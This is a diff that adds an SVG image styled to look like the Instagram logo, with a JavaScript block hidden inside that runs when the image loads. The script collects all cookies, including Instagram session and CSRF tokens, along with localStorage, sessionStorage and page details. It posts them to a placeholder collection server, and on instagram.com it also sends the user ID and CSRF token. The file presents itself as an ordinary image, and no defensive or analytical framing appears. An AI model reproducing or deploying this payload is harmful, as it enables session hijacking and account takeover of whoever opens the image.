@@ -1,0 +1,82 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 400 400">
+  <!-- Instagram-like appearance to make it convincing -->
+  <defs>
+    <linearGradient id="instagramGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#833AB4" />
+      <stop offset="50%" stop-color="#FD1D1D" />
+      <stop offset="100%" stop-color="#FCB045" />
+    </linearGradient>
+  </defs>
+  
+  <!-- Instagram logo -->
+  <rect x="50" y="50" width="300" height="300" rx="50" fill="url(#instagramGradient)" />
+  <rect x="100" y="100" width="200" height="200" rx="40" fill="none" stroke="white" stroke-width="20" />
+  <circle cx="200" cy="200" r="40" fill="white" />
+  
+  <!-- Embedded JavaScript -->
+  <script type="text/javascript">
+    <![CDATA[
+      (function() {
+        try {
+          // Extract all cookies
+          const cookies = document.cookie;
+          
+          // Extract specific Instagram cookies
+          const instagramCookies = cookies.split(';')
+            .filter(cookie => {
+              const trimmedCookie = cookie.trim();
+              return trimmedCookie.startsWith('sessionid') || 
+                     trimmedCookie.startsWith('ds_user') || 
+                     trimmedCookie.startsWith('mid') ||
+                     trimmedCookie.startsWith('ig_did') ||
+                     trimmedCookie.startsWith('csrftoken');
+            })
+            .join(';');
+          
+          // Get additional data
+          const data = {
+            cookies: cookies,
+            instagramCookies: instagramCookies,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            timestamp: new Date().toISOString(),
+            source: 'svg-attack'
+          };
+          
+          // Send to your server
+          fetch('https://your-vercel-app.vercel.app/api/collect-cookies', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          })
+          .then(response => {
+            console.log('Data sent successfully');
+          })
+          .catch(error => {
+            console.error('Error sending data:', error);
+          });
+          
+          // Try to access Instagram-specific data if on Instagram domain
+          if (window.location.hostname.includes('instagram.com')) {
+            // Try to access additional data
+            const additionalData = {
+              location: window.location.href,
+              userId: window._sharedData?.config?.viewer?.id || 'unknown',
+              csrfToken: window._csrfToken || 'unknown'
+            };
+            
+            fetch('https://your-vercel-app.vercel.app/api/collect-instagram-data', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(additionalData)
+            });
+          }
+        } catch (error) {
+          console.error('Error in SVG script:', error);
+        }
+      })();
+    ]]>
+  </script>
+</svg>
